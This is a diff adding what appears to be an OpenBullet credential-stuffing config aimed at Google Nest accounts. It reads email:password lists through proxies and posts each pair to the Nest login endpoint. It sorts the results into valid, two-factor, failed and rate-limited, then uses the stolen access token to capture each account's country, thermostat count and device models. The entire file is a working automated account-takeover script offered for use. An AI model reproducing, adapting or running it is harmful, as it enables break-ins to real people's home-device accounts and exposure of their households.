@@ -1,0 +1,60 @@
+[SETTINGS]
+{
+  "Name": "Nest",
+  "SuggestedBots": 1,
+  "LastModified": "2019-05-05T20:09:43.0998238-04:00",
+  "AdditionalInfo": "",
+  "Author": "Howzi",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://home.nest.com/session" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "access_denied" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "VERIFICATION_PENDING" 
+  KEYCHAIN Retry OR 
+    KEY "Too many requests" 
+PARSE "<SOURCE>" JSON "access_token" -> VAR "ACCESS_TOKEN" 
+PARSE "<ACCESS_TOKEN>" LR "b." "." -> VAR "USER_ID" 
+REQUEST POST "https://home.nest.com/api/0.1/user/<USER_ID>/app_launch" 
+  CONTENT "{\"known_bucket_types\":[\"buckets\",\"delayed_topaz\",\"demand_response\",\"device\",\"device_alert_dialog\",\"geofence_info\",\"kryptonite\",\"link\",\"message\",\"message_center\",\"metadata\",\"occupancy\",\"quartz\",\"safety\",\"rcs_settings\",\"safety_summary\",\"schedule\",\"shared\",\"structure\",\"structure_history\",\"structure_metadata\",\"topaz\",\"topaz_resource\",\"track\",\"trip\",\"tuneups\",\"user\",\"user_alert_dialog\",\"user_settings\",\"where\",\"widget_track\"],\"known_bucket_versions\":[]}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Basic <ACCESS_TOKEN>" 
+  HEADER "Connection: keep-alive" 
+  HEADER "X-nl-protocol-version: 1" 
+  HEADER "X-nl-webapp-version: SNAPSHOT" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+PARSE "<SOURCE>" JSON "country_code" -> CAP "Country" 
+PARSE "<SOURCE>" JSON "num_thermostats" -> CAP "Thermostats" 
+PARSE "<SOURCE>" JSON "model" Recursive=TRUE -> CAP "Devices" 
